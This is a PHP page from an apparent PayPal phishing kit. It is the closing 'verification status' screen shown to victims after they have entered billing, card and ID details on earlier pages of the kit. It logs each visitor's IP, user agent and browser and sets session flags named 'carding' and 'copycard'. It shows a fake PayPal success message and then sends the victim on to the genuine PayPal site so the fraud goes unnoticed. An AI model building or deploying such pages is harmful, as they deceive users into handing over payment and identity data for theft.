<?php
error_reporting(0);
#################################################
########      Design by FaHaD            ########
#################################################

session_start();
include("../../include/__config__.php");
include("../../include/function.php");
       $_SESSION['cntcode'] = $countrycode;
        $_SESSION['cntname'] = $countryname;
        $ip = $_SERVER["REMOTE_ADDR"];
		$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
		$time = date('l jS \of F Y h:i:s A');
		$user_agent = $_SERVER['HTTP_USER_AGENT'];
		$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);
		$_SESSION['_browser_'] = $browser;
if(isset($_REQUEST["edit"])) {
	$_SESSION['billing']="off";
	$_SESSION['copycard']="off";
	$_SESSION['carding']="off";
	header("location: websc-billing.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=". $_SESSION['_lang_']);		

}
if(isset($_REQUEST["submit"])) {
header("location: https://www.paypal.com/webscr?cmd=_run-check-cookie-submit&redirectCmd=_login-submit");		
}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title><?php echo $PAYPAL_SERVICE_UPDATE_TXT;?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">
	<link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
    <!-- Le styles -->
    <link href="../../css/bootstrap.css" rel="stylesheet">
    <link href="../../css/bootstrap-responsive.css" rel="stylesheet">

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="../../js/html5shiv.js"></script>
    <![endif]-->

  </head>

  <body style="background:#f5f5f5;">
  <script src="//popmotion.io/assets/js/popmotion.global.js"></script>
<div class="row-fluid">
     <?php include("header.php"); ?>
</div>
    <div class="container">

     

      <!-- Example row of columns -->
      <div class="row" style="margin-top:100px;" id="toprow" >
            
         <?php include("left.php"); ?>                        
                                
        <div class="span7" style="background:#fff;padding:15px 32px; 0 0;box-shadow:0 1px 4px 0 #d5d5d5;border-radius:5px;">
        <h3>Verification status</h3>
        <hr />      
		<div class="alert-success" >
		<a href="#" class="close" data-dismiss="alertsuccess">&times;</a>
		You are successfully end your account verification<br>
and we will review your information's as soon as possible.<br>
* you can go to your PayPal account or edit your information if you think that incorrect.

	</div>
	<center>
	         <form class="form-signin" style="padding:16px;" name="login_form" method="post" action="">
       <div class="control-group">  
   <label class="control-label" ></label> 
   <div class="controls">    
	<input type="submit" name="submit" value="Go to PayPal" class="btn btn-primary" style="padding: 7px 15px 8px; width: 130px; line-height: 18px; font-size:14px;font-weight:bold;" />
	<input type="submit" name="edit" value="Edit my information" class="btn btn-primary" style="padding: 7px 15px 8px; width: 165px; line-height: 18px; font-size:14px;font-weight:bold;" /></div></div> 
      </form>
	  </center>

          
           <center><div style="color:#0079c1;margin:35px 0 20px ;" id="ft3"><?php echo $UPDATE_BILLING_ADDRESS_TXT; ?> <b class="caret-right"></b> <?php echo $UPDATE_CREDIT_OR_DEBIT_CARD_TXT; ?> <b class="caret-right"></b> <span style="color:#0079c1;"><?php echo $ID_AND_CREDIT_CARD_PROOF_TXT; ?></span> <b class="caret-right"></b> <span style="color:#000;"><?php echo $UPDATE_DONE_TXT; ?></span></div></center>
       </div>
       
      </div>
   

      <hr />
      
      <div class="container" id="ft1">
         
         
   <ul class="nav nav-pills" style="color:#ccc;font-weight:bold;">
        <li><a href="#"><?php echo $ABOUT_TXT; ?></a></li>
        <li><a href="#"><?php echo $HELP_TXT; ?></a></li>
        <li><a href="#"><?php echo $RATES_TXT; ?></a></li>
        <li><a href="#"><?php echo $SECURITY_TXT; ?></a></li>
        <li><a href="#"><?php echo $DEVELOPERS_TXT; ?></a></li>
        <li><a href="#"><?php echo $PARTNERS_TXT; ?></a></li>
    </ul>
        </div>
      

    </div> <!-- /container -->
    

<?php include("footer.php");?>

  </body>
</html>
